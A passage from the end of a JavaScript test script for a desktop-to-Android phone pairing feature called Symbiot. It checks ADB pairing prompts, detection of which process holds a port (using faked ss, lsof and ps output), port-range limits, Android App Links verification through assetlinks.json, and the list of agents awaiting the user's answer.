  const ab5 = await pc.cmd("adb", { rounds: ["NEW456", "NEW456"] });
  ok("after it ran out the phone is never prompted again by itself", !ab5.calls.some((c) => / am start /.test(c)), ab5.calls);
  const reopened = await pc.cmd("usbcode");
  ok("pressing Pair a phone again clears the notice", !reopened.usbFail, reopened.usbFail);
  // a taken port: who holds it, and the way out
  const fakeRun = (out) => (cmd, args) => { if (!(cmd in out)) throw new Error("no " + cmd); return out[cmd]; };
  const h1 = P.portHolder(7392, fakeRun({ ss: 'LISTEN 0 511 0.0.0.0:7392 0.0.0.0:* users:(("node",pid=4242,fd=19))\n', ps: "Sun Oct 11 07:00:01 2026 node /home/x/symbiot/index.mjs app\n" }));
  ok("portHolder: pid, start time and command from ss + ps; another Symbiot is marked so", h1 && h1.pid === 4242 && h1.started === "Sun Oct 11 07:00:01 2026" && /index\.mjs app/.test(h1.cmd) && h1.symbiot === true, h1);
  const h2 = P.portHolder(7392, fakeRun({ lsof: "5151\n", ps: "Sun Oct 11 07:00:01 2026 python3 -m http.server 7392\n" }));
  ok("portHolder: lsof when ss isn't there; an unrelated program isn't marked Symbiot", h2 && h2.pid === 5151 && h2.symbiot === false, h2);
  ok("portHolder: nobody holds it -> null", P.portHolder(7392, fakeRun({ ss: "\n", lsof: "" })) === null);
  const busy = await new Promise((r) => { const s = createServer().listen(0, "0.0.0.0", () => r(s)); });
  const bp = busy.address().port, mine = P.portHolder(bp);
  ok("portHolder on a real listener: this process, never offered to be stopped", mine && mine.pid === process.pid && mine.symbiot === false, mine);
  busy.close();
  const bad = await P.usePhonePort(80);
  ok("a different port: below 1024 is refused", /between 1024 and 65535/.test(bad.error || ""), bad);
  const tk = await pc.cmd("taken");
  ok("a port that's taken when the link starts: it says so, then listens by itself once the holder lets go", !tk.held.listening && /^Port \d+ is (held|in use)/.test(tk.held.error || "") && tk.later.listening && !tk.later.error && tk.later.port === tk.port, tk);
  // the site vouches for the app, so a scanned link opens it at once (Android App Links)
  const links = readJ(join(SRC, "site", ".well-known", "assetlinks.json"), []), man = readFileSync(join(SRC, "android", "AndroidManifest.xml"), "utf8");
  const vouch = (links || []).find((x) => x.target && x.target.package_name === (man.match(/package="([^"]+)"/) || [])[1]);
  ok("symbiot.co.za's assetlinks.json names the app and a release key's SHA-256", !!vouch && vouch.relation.includes("delegate_permission/common.handle_all_urls") && vouch.target.sha256_cert_fingerprints.every((f) => /^([0-9A-F]{2}:){31}[0-9A-F]{2}$/.test(f)), vouch);
  const pairSite = new URL((readFileSync(join(SRC, "phone.mjs"), "utf8").match(/const PAIR_SITE = "([^"]+)"/) || [])[1]), pairHost = pairSite.host;
  ok("…and the app asks Android to check it, for the host and path the QR's link uses", new RegExp(`<intent-filter android:autoVerify="true">(?:(?!</intent-filter>)[\\s\\S])*android:scheme="https" android:host="${pairHost.replace(/\./g, "\\.")}" android:pathPrefix="${pairSite.pathname}"`).test(man), pairSite.href);
  console.log("WHAT WAITS ON YOU — the same cards as Home, from the job record");
  const askedNow = await pc.cmd("asking");
  ok("the phone lists the agent whose question is a card on Home, and not one Home dropped", Array.isArray(askedNow) && askedNow.length === 1 && askedNow[0] === "atlas", askedNow);
} finally {
  try { await pc.stop(); } catch {}
  rmSync(ROOT, { recursive: true, force: true });
}
console.log(`\n${fail ? "✗" : "✓"} phone: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
